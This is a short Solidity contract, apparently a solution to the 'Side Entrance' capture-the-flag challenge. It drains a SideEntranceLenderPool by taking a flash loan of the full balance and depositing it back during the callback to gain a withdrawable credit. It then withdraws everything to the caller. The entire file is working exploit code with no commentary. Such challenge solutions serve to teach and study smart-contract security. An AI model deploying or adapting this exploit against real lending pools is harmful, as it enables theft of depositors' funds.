// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract FlashOwned {

    SideEntranceLenderPool pool;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() payable external {
    }
}